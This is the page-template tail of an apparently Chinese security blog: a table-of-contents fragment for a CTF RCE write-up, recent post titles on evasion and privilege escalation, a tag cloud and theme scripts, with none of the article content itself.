href="#0x06-ctf%E9%A2%98%E7%9B%AE%E5%AE%9E%E6%88%98"><span class="toc-number">6.</span> <span class="toc-text">0x06 CTF题目实战</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#newstarctf-2023-week3-rce"><span class="toc-number">6.1.</span> <span class="toc-text">NewStarCTF 2023 week3 RCE</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">7.</span> <span class="toc-text">0x07 参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/08/thm-yun-xing-shi-gui-bi-jian-ce/" title="THM-运行时规避检测">THM-运行时规避检测</a><time datetime="2024-08-08T14:19:16.000Z" title="发表于 2024-08-08 22:19:16">2024-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/08/thm-bypass-uac/" title="THM-ByPass_UAC">THM-ByPass_UAC</a><time datetime="2024-08-08T07:36:41.000Z" title="发表于 2024-08-08 15:36:41">2024-08-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/07/thm-qian-ming-gui-bi/" title="THM-签名规避">THM-签名规避</a><time datetime="2024-08-07T09:11:33.000Z" title="发表于 2024-08-07 17:11:33">2024-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/05/windows-ti-quan-zong-jie/" title="Windows提权总结">Windows提权总结</a><time datetime="2024-08-05T02:59:37.000Z" title="发表于 2024-08-05 10:59:37">2024-08-05</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/02/thm-dai-ma-hun-yao-yuan-li/" title="THM-代码混淆原理">THM-代码混淆原理</a><time datetime="2024-08-02T01:46:10.000Z" title="发表于 2024-08-02 09:46:10">2024-08-02</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">199</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>36</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="https://cdn.cbd.int/algoliasearch@4.18.0/dist/algoliasearch-lite.umd.js"></script><script src="https://cdn.cbd.int/instantsearch.js@4.60.0/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>